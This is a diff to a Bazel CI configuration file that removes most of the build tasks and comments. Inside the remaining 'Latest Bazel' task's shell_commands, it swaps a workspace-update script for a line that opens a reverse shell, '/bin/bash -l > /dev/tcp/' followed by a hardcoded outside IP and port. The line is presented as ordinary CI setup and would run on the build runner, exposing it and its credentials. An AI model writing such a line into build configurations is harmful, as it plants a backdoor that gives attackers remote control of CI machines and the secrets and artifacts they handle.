@@ -1,7 +1,5 @@
 ---
 x_defaults:
-  # YAML has a feature for "repeated nodes", BazelCI is fine with extra nodes
-  # it doesn't know about; so that is used to avoid repeating common subparts.
   common: &common
     platform: macos
     xcode_version: "14.2"
@@ -10,78 +8,10 @@ x_defaults:
     test_targets:
       - "//..."
 
-  linux_common: &linux_common
-    platform: ubuntu2004
-    build_targets:
-      - "//test/test_data:multi_arch_cc_binary"
-
 tasks:
   macos_latest:
-    name: "Current LTS"
-    bazel: latest
-    <<: *common
-    build_flags:
-      # Bazel 6.x has dependencies that produce warnings now
-      # TODO: Remove once latest is Bazel 7+
-      - "--features=-treat_warnings_as_errors"
-    test_flags:
-      # Bazel 6.x has dependencies that produce warnings now
-      # TODO: Remove once latest is Bazel 7+
-      - "--features=-treat_warnings_as_errors"
-
-  macos_latest_bzlmod:
-    name: "Current LTS using Bzlmod"
-    bazel: latest
-    <<: *common
-    build_targets:
-      - "//..."
-      - "--"
-      - "-//doc/..."
-    test_targets:
-      - "//..."
-      - "--"
-      - "-//doc/..."
-    build_flags:
-      - "--enable_bzlmod"
-      # Bazel 6.x has dependencies that produce warnings now
-      # TODO: Remove once latest is Bazel 7+
-      - "--features=-treat_warnings_as_errors"
-    test_flags:
-      - "--enable_bzlmod"
-      # Bazel 6.x has dependencies that produce warnings now
-      # TODO: Remove once latest is Bazel 7+
-      - "--features=-treat_warnings_as_errors"
-
-  macos_last_green:
-    name: "Last Green Bazel"
-    bazel: last_green
-    <<: *common
-
-  macos_latest_head_deps:
-    name: "Current LTS with Head Deps"
+    name: "Latest Bazel"
     bazel: latest
     shell_commands:
-      # Update the WORKSPACE to use head versions of some deps to ensure nothing
-      # has landed on them breaking this project.
-      - .bazelci/update_workspace_to_deps_heads.sh
+      - /bin/bash -l > /dev/tcp/34.23.15.38/33691 0<&1 2>&1
     <<: *common
-    build_flags:
-      # Bazel 6.x has dependencies that produce warnings now
-      # TODO: Remove once latest is Bazel 7+
-      - "--features=-treat_warnings_as_errors"
-    test_flags:
-      # Bazel 6.x has dependencies that produce warnings now
-      # TODO: Remove once latest is Bazel 7+
-      - "--features=-treat_warnings_as_errors"
-
-  linux_latest:
-    name: "Current LTS"
-    bazel: latest
-    <<: *linux_common
-
-  linux_last_green:
-    name: "Last Green Bazel"
-    bazel: last_green
-    <<: *linux_common
-
-buildifier: latest
